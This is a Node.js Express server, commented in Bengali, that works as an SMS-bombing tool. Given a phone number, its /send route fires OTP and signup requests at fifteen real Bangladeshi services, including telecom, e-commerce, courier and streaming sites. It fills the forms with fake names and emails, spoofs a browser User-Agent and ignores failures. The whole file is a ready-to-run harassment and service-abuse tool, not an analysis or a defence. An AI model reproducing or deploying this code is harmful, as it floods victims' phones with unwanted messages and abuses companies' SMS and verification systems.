const express = require('express');
const axios = require('axios');
const app = express();

app.get('/send', async (req, res) => {
    const target = req.query.number; // ইউজার নম্বর (যেমন: 01616685690)

    if (!target || target.length < 11) {
        return res.status(400).send({ error: "Valid 11-digit number is required" });
    }

    [span_0](start_span)// ফাইল থেকে সংগৃহীত এপিআই তালিকা[span_0](end_span)
    const apiEndpoints = [
        {
            url: 'https://cokestudio23.sslwireless.com/api/store-and-send-otp',
            method: 'POST',
            data: { "msisdn": `88${target}`, "name": "Aulad Hosen", "email": "user@gmail.com", "dob": "2000-01-01", "occupation": "N/A", "gender": "male" }
        },
        {
            url: 'https://weblogin.grameenphone.com/backend/api/v1/otp',
            method: 'POST',
            data: { "msisdn": target }
        },
        {
            url: 'https://apix.rabbitholebd.com/appv2/login/requestOTP',
            method: 'POST',
            data: { "mobile": `+88${target}` }
        },
        {
            url: 'https://api.osudpotro.com/api/v1/users/send_otp',
            method: 'POST',
            data: { "mobile": `+88-${target}`, "deviceToken": "web", "language": "en", "os": "web" }
        },
        {
            url: `https://fundesh.com.bd/api/auth/generateOTP?service_key=`,
            method: 'POST',
            data: { "msisdn": target.substring(1) } // '0' বাদে নম্বর
        },
        {
            url: 'https://api.swap.com.bd/api/v1/send-otp',
            method: 'POST',
            data: { "phone": target }
        },
        {
            url: 'https://api.bd.airtel.com/v1/account/login/otp',
            method: 'POST',
            data: { "phone_number": target }
        },
        {
            url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${target}`,
            method: 'GET'
        },
        {
            url: `https://www.rokomari.com/otp/send?emailOrPhone=88${target}&countryCode=BD`,
            method: 'GET'
        },
        {
            url: `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${target}`,
            method: 'GET'
        },
        {
            url: 'https://prod-api.viewlift.com/identity/signup?site=prothomalo',
            method: 'POST',
            data: { "requestType": "send", "phoneNumber": `+88${target}`, "emailConsent": true }
        },
        {
            url: 'https://prod-api.viewlift.com/identity/signup?site=hoichoitv',
            method: 'POST',
            data: { "requestType": "send", "phoneNumber": `+88${target}`, "emailConsent": true }
        },
        {
            url: 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
            method: 'POST',
            data: { "full_name": "Test", "company_name": "Test", "email_address": "test@gmail.com", "phone_number": target }
        },
        {
            url: 'https://app.eonbazar.com/api/auth/register',
            method: 'POST',
            data: { "mobile": target, "name": "User", "password": "password123", "email": "test@gmail.com" }
        },
        {
            url: 'https://tracking.sundarbancourierltd.com/PreBooking/SendPin',
            method: 'POST',
            data: { "PreBookingRegistrationPhoneNumber": target }
        }
    ];

    // সবগুলো রিকোয়েস্ট একসাথে পাঠানো
    const requests = apiEndpoints.map(api => {
        return axios({
            method: api.method,
            url: api.url,
            data: api.data || null,
            timeout: 8000,
            headers: { 'User-Agent': 'Mozilla/5.0' }
        }).catch(() => {}); // কোনোটি ফেইল করলে ইগনোর করবে
    });

    await Promise.all(requests);

    res.send({
        success: true,
        target: target,
        total_api: apiEndpoints.length,
        message: "Requests processed."
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
